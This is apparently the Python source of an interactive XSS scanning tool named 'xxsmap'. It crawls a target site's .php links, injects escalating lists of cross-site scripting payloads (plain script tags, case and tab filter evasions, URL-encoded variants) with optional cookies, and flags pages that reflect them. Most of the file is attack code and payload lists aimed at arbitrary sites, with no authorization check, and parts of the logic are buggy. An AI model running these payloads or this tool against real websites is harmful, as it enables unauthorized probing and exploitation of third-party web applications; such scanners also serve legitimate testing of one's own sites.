import requests, sys, datetime, argparse, threading
from bs4 import BeautifulSoup

class Banner(object):

	def __init__(self):
		global banner, now
		now = datetime.datetime.now()
		banner = """
       \033[01m   \033[33m       ___     \033[00m       
       \033[01m   \033[33m      __H__    \033[00m      \033[01m\033[34m{1.0.0}\033[00m
\033[01m \033[33m__  ____  _____ [\x1b[6;30;41m(\x1b[0m\033[01m\033[33m] _ __ ___   __ _ _ ___\033[00m
\033[01m \033[33m\ \/ /\ \/ / __|[\x1b[6;30;41m)\x1b[0m\033[01m\033[33m]| '_ ` _ \ / _` | '_  )  \033[00m
\033[01m \033[33m >  <  >  <\__ \[\x1b[6;30;41m(\x1b[0m\033[01m\033[33m]| | | | | (_| | | |_) )  \033[00m
\033[01m \033[33m/_/\_\/_/\_\___/[\x1b[6;30;41m)\x1b[0m\033[01m\033[33m]|_| |_| |_|\__,_| .___)   \033[00m
\033[01m \033[33m                 V               |_|_|\033[01m\033[00m

		         """
	def load_up(self, addr):
		print(banner)
		print("\033[01m\033[34m[i]\033[00m Starting Up:", now.strftime("%Y-%m-%d %H:%M"))
		print('\033[33m[-]\033[00m URL:', addr)

class Crawler(object):

	def __init__(self, addr):
		global base_payload
		with open('/tmp/xxsmap_urls', 'w') as file:
			file.write('')
			file.close()
		base_payload = ['<script class="xxser">alert("XXS")</script>',
                        '<iframe class="xxser" src="{}"></iframe>'.format(addr),
                        '<img class="xxser" src="javascript:alert("XSS");">']

	def crawl(self, url):
		try:
			r1 = requests.get(url)
		except requests.exceptions.ConnectionError:
			print("\033[01m\033[31m[!]\033[00m Connection Error")
			exit(0)
		soup = BeautifulSoup(r1.content, "html.parser")
		links = soup.find_all("a")
		pos_vuln = 0
		xurl = []
		l = 0
		j = 0
		for link in links:
			try:
				o = link.get("href")
				l += 1
				if 'https://' not in o:
					if 'http://' not in o:
						if '.php?' in o:
							pos_vuln += 1
							j += 1
							d = o.find('=')
							for pay in base_payload:
								murl = o[:1+d] + pay
								with open('/tmp/xxsmap_urls', 'r') as file:
									if murl not in file.read():
										file.close()
										with open('/tmp/xxsmap_urls', 'a') as file:
											file.write(murl + '\n')
											file.close()
									else: pass
						
						if j == 0:
							if '.php' in o:
								pos_vuln += 1
								#print('\033[33m[-]\033[00m Forcing id parameter')
								o = o + '?id='
								d = o.find('=')
								for pay in base_payload:
									murl = o[:1+d] + pay
									with open('/tmp/xxsmap_urls', 'r') as file:
										if murl not in file.read():
											file.close()
											with open('/tmp/xxsmap_urls', 'a') as file:
												file.write(murl + '\n')
												file.close()
			except TypeError: pass

		print('\033[33m[-]\033[00m URLS Found:', l)
		print('\033[01m\033[32m[+]\033[00m Possably Vulnerable:', pos_vuln)
		return pos_vuln

class XXS_ER(object):
	
	def __init__(self):
		global urls
		with open('/tmp/xxsmap_urls', 'r') as file:
			urls = file.readlines()
	
	def basic_attack(self, addr, daddr, cookie):
		if addr != None:
			fa = 0
			found = []
			y = 0
			for i in urls:
				xurl = addr+ '/' + i
				a = i.find('<')
				d = i.find(' ')
				type = i[a+1:d]
				r = requests.get(xurl)
				soup = BeautifulSoup(r.content, 'html.parser')
				g_data = soup.find_all(type, {"class": "xxser"})
				f = False
				for line in g_data:
					if xurl.strip() not in found:
						print("")
						print('\033[01m\033[32m[+]\033[00m',xurl.strip())
						found.append(xurl.strip())
						try:
							f = q
						except UnboundLocalError:
							q = ''
							r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42mThere Was An XXS Vulnerability Found, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
							if r == 'y':
								f = True
							elif r == 'n':
								p = True
								return p
				if f == False:
					fa += 1
					sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Basic Attack:\033[00m {}'.format(fa))
					sys.stdout.flush()

		if daddr != None:
			a = 0
			if cookie == None:
				print("\033[31m\033[33m[-]\033[00m No Cookie")
			else:
				pass
			for x in urls:
				xurl = daddr+x
				if cookie != None:
					r = requests.get(xurl, cookies=cookie)
				else:
					r = requests.get(xurl)
					#'ISO-8859-1'
				try:
					if x in r.content.decode('utf-8').replace('&quot;', '"').replace('&gt;', '>').replace('&lt;', '<'):
						print('\033[01m\033[32m[+]\033[00m', xurl.strip())
						try:
							print(n)
						except UnboundLocalError:
							n = ''
							r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42m90% Sure There Was An XXS Vulnerability Found Although The Website Might Be Using \'htmlspecialchars\' If This Does Not Work Then They Are, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
							if r == 'y':
								pass
							elif r == 'n':
								return True
					else:
						a += 1
						sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Medium Attack:\033[00m {}'.format(a))
						sys.stdout.flush()
				
				except UnicodeDecodeError:
					
					if x in r.content.decode('ISO-8859-1').replace('&quot;', '"').replace('&gt;', '>').replace('&lt;', '<'):
						print('\033[01m\033[32m[+]\033[00m', xurl.strip())
						try:
							print(n)
						except UnboundLocalError:
							n = ''
							r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42mThere Was An XXS Vulnerability Found, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
							if r == 'y':
								pass
							elif r == 'n':
								return True
					else:
						a += 1
						sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Medium Attack:\033[00m {}'.format(a))
						sys.stdout.flush()

		return False
		
		

	def medium_attack(self, addr, daddr, cookie): 
		med_payloads = ['<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
		                '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>,',
		                '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
		                '<IMG SRC=javascript:alert("XSS")>',
		                '<<SCRIPT>alert("XSS");//<</SCRIPT>',
		                '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
		                '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
		                '<IMG SRC="jav	ascript:alert(\'XSS\');">',
		                '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">']

		if addr != None:
			a = 0
			for i in urls:
				s = str(i.find('='))
				q = int(s) + 1
				v = i[:q]
				if '<' and ' class=' in v:
					pass
				else:
					for x in med_payloads:
						xurl = addr+v+x
						r = requests.get(xurl)
						try:
							if x in r.content.decode('utf-8'):
								print('\n\033[01m\033[32m[+]\033[00m', xurl.strip())
								try:
									print(n)
								except UnboundLocalError:
									n = ''
									r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42mThere Was An XXS Vulnerability Found, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
									if r == 'y':
										pass
									elif r == 'n':
										return True
							else:
								a += 1
								sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Medium Attack:\033[00m {}'.format(a))
								sys.stdout.flush()

						except UnicodeDecodeError:
								if x in r.content.decode('ISO-8859-1').replace('&quot;', '"').replace('&gt;', '>').replace('&lt;', '<'):
									print('\033[01m\033[32m[+]\033[00m', xurl.strip())
									try:
										print(n)
									except UnboundLocalError:
										n = ''
										r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42mThere Was An XXS Vulnerability Found, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
										if r == 'y':
											pass
										elif r == 'n':
											return True
								else:
									a += 1
									sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Medium Attack:\033[00m {}'.format(a))
									sys.stdout.flush()

		if daddr != None:
			a = 0
			if cookie == None:
				print("\033[31m\033[33m[-]\033[00m No Cookie")
			else:
				pass
			for x in med_payloads:
				xurl = daddr+x
				if cookie != None:
					r = requests.get(xurl, cookies=cookie)
				else:
					r = requests.get(xurl)
					#'ISO-8859-1'
				try:
					if x in r.content.decode('utf-8').replace('&quot;', '"').replace('&gt;', '>').replace('&lt;', '<'):
						print('\033[01m\033[32m[+]\033[00m', xurl.strip())
						try:
							print(n)
						except UnboundLocalError:
							n = ''
							r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42m90% Sure There Was An XXS Vulnerability Found Although The Website Might Be Using \'htmlspecialchars\' If This Does Not Work Then They Are, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
							if r == 'y':
								pass
							elif r == 'n':
								return True
					else:
						a += 1
						sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Medium Attack:\033[00m {}'.format(a))
						sys.stdout.flush()
				
				except UnicodeDecodeError:
					
					if x in r.content.decode('ISO-8859-1').replace('&quot;', '"').replace('&gt;', '>').replace('&lt;', '<'):
						print('\033[01m\033[32m[+]\033[00m', xurl.strip())
						try:
							print(n)
						except UnboundLocalError:
							n = ''
							r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42mThere Was An XXS Vulnerability Found, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
							if r == 'y':
								pass
							elif r == 'n':
								return True
					else:
						a += 1
						sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Medium Attack:\033[00m {}'.format(a))
						sys.stdout.flush()
		return False

	def encoded_attack(self, addr, daddr, cookie): 
		encode_payloads = ['%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2fSCRIPT%3E%22%3E',
		                   '%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2f%2f%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2f%2f%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2f%2f%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2f%2f--%3E%3C%2fSCRIPT%3E%22%3E%5C%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2fSCRIPT%3E%2C',
		                   '%3CIMG%20SRC%3DJaVaScRiPt%3Aalert%28%5C%27XSS%5C%27%29%3E',
		                   '%3CIMG%20SRC%3Djavascript%3Aalert%28%22XSS%22%29%3E',
		                   '%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2f%2f%3C%3C%2fSCRIPT%3E',
		                   '%3C%2fTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2fSCRIPT%3E']
		if addr != None:
			a = 0
			for i in urls:
				s = str(i.find('='))
				q = int(s) + 1
				v = i[:q]
				if '<' and ' class=' in v:
					pass
				else:
					for x in encode_payloads:
						xurl = addr+v+x
						r = requests.get(xurl)
						try:
							if x in r.content.decode('utf-8'):
								print('\n\033[01m\033[32m[+]\033[00m', xurl.strip())
								try:
									print(n)
								except UnboundLocalError:
									n = ''
									r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42mThere Was An XXS Vulnerability Found, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
									if r == 'y':
										pass
									elif r == 'n':
										return True
							else:
								a += 1
								sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Encoded Attack:\033[00m {}'.format(a))
								sys.stdout.flush()

						except UnicodeDecodeError:
							if x in r.content.decode('ISO-8859-1').replace('&quot;', '"').replace('&gt;', '>').replace('&lt;', '<'):
								print('\033[01m\033[32m[+]\033[00m', xurl.strip())
								try:
									print(n)
								except UnboundLocalError:
									n = ''
									r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42mThere Was An XXS Vulnerability Found, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
									if r == 'y':
										pass
									elif r == 'n':
										return True
							else:
								a += 1
								sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Medium Attack:\033[00m {}'.format(a))
								sys.stdout.flush()
		if daddr != None:
			a = 0
			gg = ''
			printed = []
			if cookie == None:
				print("\033[31m\033[33m[-]\033[00m No Cookie")
			else:
				pass
			for x in encode_payloads:
				xurl = daddr+x
				if cookie != None:
					r = requests.get(xurl, cookies=cookie)
				else:
					r = requests.get(xurl)
					#'ISO-8859-1'
				try:
					if x in r.content.decode('utf-8').replace('&quot;', '"').replace('&gt;', '>').replace('&lt;', '<'):
						if x not in printed:
							printed.append(x)
							print('\033[01m\033[32m[+]\033[00m', xurl.strip())
							try:
								print(n)
							except UnboundLocalError:
								n = ''
								r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42m90% Sure There Was An XXS Vulnerability Found Although The Website Might Be Using \'htmlspecialchars\' If This Does Not Work Then They Are, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
								if r == 'y':
									pass
								elif r == 'n':
									return True
					else:
						a += 1
						sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Encoded Attack:\033[00m {}'.format(a))
						sys.stdout.flush()
				
				except UnicodeDecodeError:
					
					if x in r.content.decode('ISO-8859-1').replace('&quot;', '"').replace('&gt;', '>').replace('&lt;', '<'):
						print('\033[01m\033[32m[+]\033[00m', xurl.strip())
						try:
							print(n)
						except UnboundLocalError:
							n = ''
							r = input("\033[01m\033[34m[i] \033[00m\x1b[6;37;42mThere Was An XXS Vulnerability Found, Continue Searching [Y]es or [N]o:\x1b[0m ").lower()
							if r == 'y':
								gg = True
								pass
							elif r == 'n':
								return True
					else:
						a += 1
						sys.stdout.write('\r\033[31m\033[33m[-]\033[00m Encoded Attack:\033[00m {}'.format(a))
						sys.stdout.flush()
		if gg != True:
			return False

class Controler(object):
	
	def __init__(self):
		global now, args
		now = datetime.datetime.now()
		parser = argparse.ArgumentParser()
		parser.add_argument('--site', '-s')
		parser.add_argument('--address', '-a')
		parser.add_argument('--cookie', '-c', nargs='*')
		parser.add_argument('--encoded', '-n')
		parser.add_argument('--threads', '-t', default=5)
		args = parser.parse_args()

	def control(self):
		if args.site:
			addr = ''.join(args.site)
			b = Banner()
			b.load_up(addr)
			c = Crawler(''.join(addr))
			pos_vuln =  c.crawl(addr)
			x = XXS_ER()
			daddr = None
			p = x.basic_attack(addr, daddr, args.cookie)
			if p == True:
				print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
				exit(0)
			elif p == False:
				print('\n\033[01m\033[31m[!]\033[00m Basic Attack Failed')
				r = input("\033[01m\033[34m[i] \033[00m\x1b[1;37;43mWould Your Like To Try A Harder Attack? [Y]es or [N]o:\x1b[0m ").lower()
				if r == 'y':
					p = x.medium_attack(addr, args.address, args.cookie)
					if p == True:
						print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
						exit(0)
					elif p == False:
						print('\n\033[01m\033[31m[!]\033[00m Medium Attack Failed')
						r = input("\033[01m\033[34m[i] \033[00m\x1b[1;37;43mWould Your Like To Try A Harder Attack? [Y]es or [N]o:\x1b[0m ").lower()
						if r == 'y':
							xp = x.encoded_attack(addr, daddr, args.cookie)
							if xp == True:
								print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
								exit(0)
							elif p == False:
								print('\n\033[01m\033[31m[!]\033[00m Encoded Attack Failed')
								print("\033[01m\033[31m[!]\033[00m Site Is Not Vulnerable To XXS")
						if p == True:
							print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
							exit(0)
							
				elif r == 'n':
					print("\n\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
					exit(0)

		if args.address:
			b = Banner()
			b.load_up(args.address.split("//")[-1].split("/")[0])
			x = XXS_ER()
			dadr = args.address.find('=')
			daddr = args.address[:int(dadr)+1]
			addr = None
			if args.cookie:
				print("\033[31m\033[33m[-]\033[00m Cookie:", '; '.join(args.cookie))
				cookie = '; '.join(args.cookie)
				cookies = dict(cookies_are=cookie)
			else:
				cookies = None
			p = x.basic_attack(addr, daddr, cookies)
			if p == True:
				print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
				exit(0)
			elif p == False: 
				print('\n\033[01m\033[31m[!]\033[00m Basic Attack Failed')
				r = input("\033[01m\033[34m[i] \033[00m\x1b[1;37;43mWould Your Like To Try A Harder Attack? [Y]es or [N]o:\x1b[0m ").lower()
				if r == 'y':
					p = x.medium_attack(addr, args.address, args.cookie)
					if p == True:
						print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
						exit(0)
					elif p == False:
						print('\n\033[01m\033[31m[!]\033[00m Medium Attack Failed')
						r = input("\033[01m\033[34m[i] \033[00m\x1b[1;37;43mWould Your Like To Try A Harder Attack? [Y]es or [N]o:\x1b[0m ").lower()
						if r == 'y':
							p = x.encoded_attack(addr, args.address, args.cookie)
							if p == True:
								print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
								exit(0)
							elif p == False:
								print('\n\033[01m\033[31m[!]\033[00m Encoded Attack Failed')
								print("\033[01m\033[31m[!]\033[00m Site Is Not Vulnerable To XXS")
						else:
							print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))

				elif r == 'n':
					print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))
					exit(0)

			print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))

if __name__ == '__main__':
	try:
		thread_count = 10
		for i in range(thread_count):
		    t = threading.Thread(target=Controler().control())
		    t.deamon = True
		    t.start()
	except KeyboardInterrupt:
		print("\n\033[01m\033[34m[i] \033[00mUser Requests Shutdown...")
		print("\033[01m\033[34m[i] \033[00mShutting Down:", now.strftime("%Y-%m-%d %H:%M"))